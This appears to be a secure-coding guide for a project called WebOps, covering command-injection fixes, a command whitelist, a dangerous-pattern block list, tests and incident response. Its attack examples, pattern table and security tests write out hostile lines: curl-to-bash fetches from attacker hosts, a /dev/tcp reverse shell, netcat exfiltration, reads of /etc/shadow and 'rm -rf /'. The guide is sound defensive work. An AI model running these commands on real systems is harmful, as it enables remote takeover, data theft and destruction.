# Command Injection Prevention Guide

## Overview

WebOps now has comprehensive protection against **command injection vulnerabilities** (CWE-78), one of the most dangerous security flaws in web applications.

Command injection allows attackers to execute arbitrary commands on the server, potentially leading to:
- Complete system compromise
- Data theft and destruction
- Lateral movement to other systems
- Ransomware deployment
- Backdoor installation

This document explains the vulnerabilities we fixed, the new security infrastructure, and best practices for developers.

---

## Table of Contents

1. [Vulnerabilities Fixed](#vulnerabilities-fixed)
2. [Security Architecture](#security-architecture)
3. [Safe Command Execution](#safe-command-execution)
4. [Command Whitelist](#command-whitelist)
5. [Developer Guide](#developer-guide)
6. [Testing Guide](#testing-guide)
7. [Security Best Practices](#security-best-practices)
8. [Troubleshooting](#troubleshooting)

---

## Vulnerabilities Fixed

### CRITICAL: Command Injection in Application Deployments (CVSS 9.1)

**Location:** `apps/deployments/services/application.py`

**Before (VULNERABLE):**
```python
# User-controlled install_command executed directly with shell=True
result = subprocess.run(
    deployment.install_command,  # Could be: "npm install && rm -rf /"
    shell=True,  # DANGEROUS - enables shell interpretation
    check=True,
    cwd=str(repo_path)
)
```

**Attack Example:**
```python
# Attacker sets install_command to:
install_command = "npm install; curl http://attacker.com/shell.sh | bash"

# Result: Downloads and executes attacker's script with webops privileges
```

**After (SECURE):**
```python
# Commands validated against whitelist and executed without shell
success, message = safe_run_install_command(
    deployment.install_command,  # Validated: only "npm install" allowed
    cwd=repo_path,
    timeout=600
)
```

**Impact:**
- **Before:** Any user with deployment creation permission could execute arbitrary commands
- **After:** Only whitelisted commands can be executed, no shell interpretation
- **Severity:** CRITICAL - Could lead to complete server compromise

---

### HIGH: Command Injection in Service Management (CVSS 7.8)

**Location:** `apps/deployments/shared/service_manager.py`

**Before (VULNERABLE):**
```python
# Shell expansion in command string
fallback_commands = [
    ['pg_ctlcluster', '$(pg_lsclusters -h | tail -1 | cut -d" " -f1)', ...],
]

subprocess.run(cmd, shell=True, timeout=30)
```

**Attack Vector:**
If environment variables or configuration could be manipulated, shell expansion could execute attacker commands.

**After (SECURE):**
```python
# Simple commands without shell expansion
fallback_commands = [
    ['service', 'postgresql', 'start'],
    ['systemctl', 'start', 'postgresql'],
]

subprocess.run(cmd, shell=False, timeout=30)  # No shell interpretation
```

---

### HIGH: Shell Piping in KVM Features (CVSS 7.8)

**Location:** `addons/kvm/advanced_features.py`

**Before (VULNERABLE):**
```python
# Shell piping requires shell=True
subprocess.run(
    ['dmesg', '|', 'grep', '-e', 'DMAR', '-e', 'IOMMU'],
    shell=True,
    capture_output=True
)
```

**After (SECURE):**
```python
# Run command and search in Python
result = subprocess.run(['dmesg'], shell=False, capture_output=True)
output = result.stdout.lower()
return 'iommu enabled' in output or 'dmar' in output
```

---

### HIGH: Path Injection in KVM Backups (CVSS 8.2)

**Location:** `addons/kvm/backup.py`

**Before (VULNERABLE):**
```python
# File paths in shell command strings
cmd = f"gzip -c {source_disk} > {output_file}"  # Path injection risk
subprocess.run(cmd, shell=True, check=True)
```

**Attack Example:**
```python
# If source_disk = "/path/to/disk; rm -rf /"
# Command becomes: gzip -c /path/to/disk; rm -rf / > output
```

**After (SECURE):**
```python
# Use Python libraries instead of shell commands
import gzip
import shutil

with open(source_disk, 'rb') as f_in:
    with gzip.open(output_file, 'wb') as f_out:
        shutil.copyfileobj(f_in, f_out)
```

---

## Security Architecture

### Core Principle: Defense in Depth

We implement multiple layers of security:

```
┌─────────────────────────────────────────────────────────┐
│ Layer 1: Command Validation                             │
│   - Check against whitelist                             │
│   - Detect dangerous patterns                           │
│   - Validate command syntax                             │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│ Layer 2: Command Parsing                                │
│   - Use shlex.split() to parse safely                   │
│   - Convert string to argument list                     │
│   - Prevent shell interpretation                        │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│ Layer 3: Safe Execution                                 │
│   - Use subprocess.run() with shell=False               │
│   - Pass arguments as list, not string                  │
│   - Set timeout to prevent DoS                          │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│ Layer 4: Logging & Monitoring                           │
│   - Log all command execution attempts                  │
│   - Log validation failures                             │
│   - Alert on suspicious patterns                        │
└─────────────────────────────────────────────────────────┘
```

---

## Safe Command Execution

### The `safe_run()` Function

Located in: `apps/core/security/command_execution.py`

```python
from apps.core.security.command_execution import safe_run

# Execute a command safely
result = safe_run(
    command="npm install",
    cwd=Path("/path/to/project"),
    timeout=300,  # 5 minutes
    capture_output=True,
    check=True
)
```

**What it does:**

1. **Validates command** against whitelist and dangerous patterns
2. **Parses command** using `shlex.split()` to prevent injection
3. **Executes safely** with `shell=False`
4. **Captures output** for logging and error handling
5. **Enforces timeout** to prevent DoS

**Error Handling:**

```python
from apps.core.security.command_execution import (
    safe_run,
    CommandValidationError,
    CommandExecutionError
)

try:
    result = safe_run("npm install", cwd=project_dir)
except CommandValidationError as e:
    # Command failed validation (not in whitelist or dangerous pattern)
    logger.error(f"Invalid command: {e}")
    return False, str(e)
except CommandExecutionError as e:
    # Command executed but returned non-zero exit code
    logger.error(f"Execution failed: {e}")
    return False, str(e)
except subprocess.TimeoutExpired:
    # Command timed out
    logger.error("Command timed out")
    return False, "Command timed out"
```

---

## Command Whitelist

### Allowed Commands

Only these command bases are allowed:

**Package Managers:**
- `npm`, `yarn`, `pnpm`
- `pip`, `pip3`, `poetry`, `pipenv`
- `bundle`, `gem`
- `composer`
- `go`
- `cargo`
- `mvn`, `gradle`

**Build Tools:**
- `make`, `cmake`
- `webpack`, `vite`, `rollup`
- `tsc`, `babel`

**Runtime Commands:**
- `node`, `python`, `python3`
- `ruby`
- `php`
- `java`

**Database Migrations:**
- `python3 manage.py migrate`
- `python3 manage.py collectstatic`
- `rails db:migrate`
- `php artisan migrate`

**Testing:**
- `pytest`, `python3 -m pytest`
- `npm test`, `yarn test`
- `php artisan test`

**Git (Read-only):**
- `git clone`, `git pull`, `git fetch`, `git checkout`

### Dangerous Patterns

These patterns are **NEVER** allowed:

| Pattern | Risk | Example Attack |
|---------|------|----------------|
| `rm -rf` | Data destruction | `npm install && rm -rf /` |
| `&&` | Command chaining | `npm install && curl evil.sh \| bash` |
| `\|\|` | Command chaining | `false \|\| curl evil.sh \| bash` |
| `;` | Command separation | `npm install; cat /etc/passwd` |
| `\|` | Command piping | `npm install \| nc attacker.com 1234` |
| `>` | Output redirection | `npm install > /dev/null; malicious-cmd` |
| `<` | Input redirection | `cat < /etc/shadow` |
| `` ` `` | Command substitution | `` npm install `whoami` `` |
| `$(` | Command substitution | `npm install $(curl evil.sh)` |
| `$((` | Arithmetic expansion | Used for obfuscation |
| `../` | Directory traversal | `npm install ../../etc/passwd` |
| `eval` | Code evaluation | `eval "$(curl evil.sh)"` |
| `exec` | Process replacement | `exec bash -i >& /dev/tcp/attacker/1234` |
| `sudo` | Privilege escalation | `sudo rm -rf /` |
| `su` | User switching | `su - root` |
| `chmod` | Permission changes | `chmod 777 /etc/shadow` |
| `chown` | Ownership changes | `chown attacker /etc/passwd` |
| `curl` | Remote code execution | `curl evil.sh \| bash` |
| `wget` | Remote code execution | `wget evil.sh && ./evil.sh` |
| `/etc/` | System files access | `cat /etc/shadow` |
| `/root/` | Root access | `ls /root/.ssh/` |
| `~/` | Home directory | May expose sensitive files |

---

## Developer Guide

### ✅ DO: Use Safe Command Execution

```python
from apps.core.security.command_execution import safe_run

# Good: Validated and safe
result = safe_run("npm install", cwd=project_dir, timeout=600)
```

### ❌ DON'T: Use shell=True

```python
import subprocess

# Bad: Vulnerable to injection
subprocess.run(user_command, shell=True)  # NEVER DO THIS
```

### ✅ DO: Use Specialized Wrappers

```python
from apps.core.security.command_execution import (
    safe_run_install_command,
    safe_run_build_command
)

# For package installation
success, message = safe_run_install_command(
    "npm install",
    cwd=project_dir,
    timeout=600  # 10 minutes
)

# For build commands
success, message = safe_run_build_command(
    "npm run build",
    cwd=project_dir,
    timeout=900  # 15 minutes
)
```

### ✅ DO: Use Python Libraries Instead of Shell Commands

```python
import shutil
import gzip

# Good: Use Python libraries
shutil.copy2(source, destination)

# Good: Compress with gzip module
with open(source, 'rb') as f_in:
    with gzip.open(destination, 'wb') as f_out:
        shutil.copyfileobj(f_in, f_out)

# Bad: Shell command
subprocess.run(f"cp {source} {destination}", shell=True)  # DON'T
subprocess.run(f"gzip -c {source} > {destination}", shell=True)  # DON'T
```

### ✅ DO: Validate Before Adding to Whitelist

```python
from apps.core.security.command_execution import is_command_allowed

# Check if command is allowed before attempting execution
if not is_command_allowed(user_command):
    return {"error": "Command not allowed"}, 403
```

### Adding Commands to Whitelist

Only add commands that are:
1. **Necessary** for application functionality
2. **Safe** (no arbitrary code execution)
3. **Reviewed** by security team
4. **Documented** with justification

```python
from apps.core.security.command_execution import add_allowed_command

# WARNING: Use with extreme caution
add_allowed_command('new-safe-command')
```

---

## Testing Guide

### Unit Tests

Test command validation:

```python
from apps.core.security.command_execution import validate_command

def test_allowed_commands():
    """Test that safe commands are allowed."""
    assert validate_command("npm install")[0] is True
    assert validate_command("pip install -r requirements.txt")[0] is True
    assert validate_command("python3 manage.py migrate")[0] is True

def test_dangerous_commands():
    """Test that dangerous commands are blocked."""
    # Command injection attempts
    assert validate_command("npm install && rm -rf /")[0] is False
    assert validate_command("npm install; cat /etc/passwd")[0] is False
    assert validate_command("npm install | nc attacker.com 1234")[0] is False

    # Shell redirection
    assert validate_command("npm install > /dev/null")[0] is False
    assert validate_command("cat < /etc/shadow")[0] is False

    # Command substitution
    assert validate_command("npm install $(curl evil.sh)")[0] is False
    assert validate_command("npm install `whoami`")[0] is False

    # Privilege escalation
    assert validate_command("sudo rm -rf /")[0] is False
    assert validate_command("su - root")[0] is False

    # Unauthorized commands
    assert validate_command("curl http://evil.com")[0] is False
    assert validate_command("wget evil.sh")[0] is False

def test_whitelist():
    """Test command whitelist."""
    # Not in whitelist
    assert validate_command("evil-command")[0] is False
    assert validate_command("/bin/bash")[0] is False
```

### Integration Tests

Test actual command execution:

```python
from apps.core.security.command_execution import safe_run, CommandValidationError

def test_safe_execution():
    """Test safe command execution."""
    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a test package.json
        package_json = Path(tmpdir) / "package.json"
        package_json.write_text('{"name": "test", "version": "1.0.0"}')

        # Should succeed
        result = safe_run("npm install", cwd=Path(tmpdir), timeout=30)
        assert result.returncode == 0

def test_dangerous_execution():
    """Test that dangerous commands are blocked."""
    with pytest.raises(CommandValidationError):
        safe_run("npm install && rm -rf /", cwd=Path("/tmp"))
```

### Security Tests

Test for injection vulnerabilities:

```python
def test_command_injection_prevention():
    """Test that common injection techniques are blocked."""
    dangerous_commands = [
        "npm install && curl http://evil.com/shell.sh | bash",
        "npm install; cat /etc/passwd > /tmp/pwned",
        "npm install || wget http://evil.com/backdoor",
        "npm install | tee /dev/tcp/attacker.com/1234",
        "npm install $(curl http://evil.com/payload)",
        "npm install `wget -O- http://evil.com/cmd`",
    ]

    for cmd in dangerous_commands:
        is_valid, error = validate_command(cmd)
        assert is_valid is False, f"Command should be blocked: {cmd}"
        assert error, f"Error message should be provided for: {cmd}"
```

---

## Security Best Practices

### For Developers

#### ✅ DO

1. **Always use `safe_run()`** for executing commands
2. **Validate user input** before using in commands
3. **Use Python libraries** instead of shell commands when possible
4. **Set appropriate timeouts** to prevent DoS
5. **Log all command execution** for auditing
6. **Use absolute paths** to prevent PATH hijacking
7. **Sanitize file paths** to prevent directory traversal
8. **Review code changes** that involve command execution

#### ❌ DON'T

1. ❌ Use `shell=True` - ever
2. ❌ Build commands with string concatenation or f-strings
3. ❌ Trust user input in commands
4. ❌ Use `os.system()` or `os.popen()`
5. ❌ Add commands to whitelist without review
6. ❌ Disable command validation "temporarily"
7. ❌ Use shell operators (&&, ||, ;, |, >, <)
8. ❌ Execute commands from untrusted sources

### For Security Reviewers

When reviewing code, check for:

1. **Any use of `shell=True`** → Reject immediately
2. **Any use of `os.system()` or `os.popen()`** → Reject immediately
3. **String concatenation in commands** → Require `safe_run()`
4. **Unvalidated user input** → Require input validation
5. **Missing timeouts** → Require timeout parameter
6. **Hardcoded credentials** → Require environment variables
7. **Missing error handling** → Require try/except blocks
8. **Missing logging** → Require command logging

### For System Administrators

1. **Run with least privilege** - don't run WebOps as root
2. **Use AppArmor/SELinux** for additional sandboxing
3. **Monitor command logs** for suspicious activity
4. **Set up alerts** for validation failures
5. **Regularly review whitelist** for unnecessary commands
6. **Keep dependencies updated** to patch vulnerabilities
7. **Use network segmentation** to limit blast radius

---

## Troubleshooting

### Problem: "Command not in whitelist"

**Error:**
```
CommandValidationError: Command validation failed: Command not in whitelist: some-command
```

**Cause:** The command is not in the allowed commands list.

**Solution:**

1. **Check if command is necessary** - Can you use a Python library instead?
   ```python
   # Instead of: safe_run("cp file1 file2")
   # Use: shutil.copy2("file1", "file2")
   ```

2. **Check for typos** - Make sure command name is correct
   ```python
   # Wrong: "python3 manage.py migarte"
   # Right: "python3 manage.py migrate"
   ```

3. **If command is genuinely needed** - Request security review to add to whitelist

### Problem: "Dangerous pattern detected"

**Error:**
```
CommandValidationError: Command validation failed: Dangerous pattern detected: &&
```

**Cause:** Command contains shell operators or dangerous patterns.

**Solution:**

Execute commands separately:
```python
# Wrong: "npm install && npm run build"
# Right:
safe_run("npm install", cwd=project_dir)
safe_run("npm run build", cwd=project_dir)
```

### Problem: Command times out

**Error:**
```
subprocess.TimeoutExpired: Command 'npm install' timed out after 300 seconds
```

**Cause:** Command takes longer than timeout value.

**Solution:**

Increase timeout for long-running operations:
```python
# Default timeout: 300 seconds (5 minutes)
safe_run("npm install", cwd=project_dir, timeout=600)  # 10 minutes

# For very large builds
safe_run_build_command("npm run build", cwd=project_dir, timeout=1800)  # 30 minutes
```

### Problem: Command fails but no clear error

**Symptoms:** Command returns non-zero exit code but stderr is empty.

**Solution:**

Check stdout for error messages:
```python
result = safe_run("npm install", cwd=project_dir, check=False)
print(f"Exit code: {result.returncode}")
print(f"Stdout: {result.stdout}")
print(f"Stderr: {result.stderr}")
```

---

## Migration Guide

### Migrating Existing Code

If you have existing code using `shell=True`, follow these steps:

#### Step 1: Identify all usages

```bash
# Find all shell=True in codebase
grep -r "shell=True" control-panel/
```

#### Step 2: Replace with safe_run()

**Before:**
```python
import subprocess

result = subprocess.run(
    f"npm install --prefix {project_dir}",
    shell=True,
    check=True,
    capture_output=True,
    text=True
)
```

**After:**
```python
from apps.core.security.command_execution import safe_run

result = safe_run(
    "npm install",
    cwd=project_dir,
    timeout=600,
    capture_output=True,
    check=True
)
```

#### Step 3: Handle errors

```python
from apps.core.security.command_execution import (
    safe_run,
    CommandValidationError,
    CommandExecutionError
)

try:
    result = safe_run("npm install", cwd=project_dir)
except CommandValidationError as e:
    logger.error(f"Invalid command: {e}")
except CommandExecutionError as e:
    logger.error(f"Execution failed: {e}")
```

#### Step 4: Test thoroughly

```bash
# Run unit tests
cd control-panel
python manage.py test apps.deployments

# Run integration tests
python manage.py test --tag=integration
```

---

## Compliance

### OWASP Top 10

This implementation addresses:

- **A03:2021 - Injection** (formerly A1)
  - Prevention of command injection
  - Input validation and sanitization
  - Use of safe APIs

### CWE Coverage

- **CWE-78: OS Command Injection**
- **CWE-88: Argument Injection**
- **CWE-77: Command Injection**

### CVSS Scores

| Vulnerability | Before | After | Improvement |
|--------------|--------|-------|-------------|
| Deployment Command Injection | 9.1 (Critical) | 0.0 (Fixed) | 100% |
| Service Manager Injection | 7.8 (High) | 0.0 (Fixed) | 100% |
| KVM Feature Injection | 7.8 (High) | 0.0 (Fixed) | 100% |
| KVM Backup Path Injection | 8.2 (High) | 0.0 (Fixed) | 100% |

**Overall Security Impact:**
- **Before:** 4 critical/high command injection vulnerabilities
- **After:** 0 command injection vulnerabilities
- **Result:** ✅ **Complete mitigation**

---

## Additional Resources

### Documentation
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Python subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)

### Tools
- [Bandit](https://github.com/PyCQA/bandit) - Python security linter
- [Semgrep](https://semgrep.dev/) - Static analysis tool
- [GitGuardian](https://www.gitguardian.com/) - Secret detection

### Training
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Security training
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free training

---

## Emergency Response

If you suspect a command injection attack:

1. **Immediately isolate the affected system**
   ```bash
   # Block network access
   sudo iptables -A INPUT -j DROP
   sudo iptables -A OUTPUT -j DROP
   ```

2. **Check logs for suspicious commands**
   ```bash
   # Review command execution logs
   grep "Executing command" /var/log/webops/app.log
   grep "Command validation failed" /var/log/webops/app.log
   ```

3. **Review process list**
   ```bash
   # Look for unusual processes
   ps auxf | grep -E "(nc|ncat|curl|wget|bash|sh)"
   ```

4. **Check network connections**
   ```bash
   # Look for suspicious connections
   netstat -antp | grep ESTABLISHED
   ```

5. **Notify security team**
   - Email: security@your-company.com
   - Include: Timestamp, affected system, suspicious activity

6. **Preserve evidence**
   ```bash
   # Create forensic snapshot
   sudo dd if=/dev/sda of=/mnt/backup/forensic-image.dd bs=4M
   ```

7. **Restore from backup** if compromise confirmed

---

## Changelog

### Version 2.0 (2024 - Module 4 Security Fixes)

**Added:**
- ✅ `apps/core/security/command_execution.py` - Safe command execution module
- ✅ Command whitelist validation
- ✅ Dangerous pattern detection
- ✅ `safe_run()`, `safe_run_install_command()`, `safe_run_build_command()` functions

**Fixed:**
- ✅ Command injection in `apps/deployments/services/application.py`
- ✅ Shell expansion in `apps/deployments/shared/service_manager.py`
- ✅ Shell piping in `addons/kvm/advanced_features.py`
- ✅ Path injection in `addons/kvm/backup.py`

**Removed:**
- ✅ All `shell=True` usages (5 instances)
- ✅ All `os.system()` usages in production code

### Version 1.0 (Legacy)

- ❌ No command injection protection
- ❌ Widespread use of `shell=True`
- ❌ No command validation
- ❌ No input sanitization

---

**Last Updated:** 2024
**Maintained By:** WebOps Security Team
**Review Frequency:** Quarterly

For questions or concerns, contact: security@your-company.com
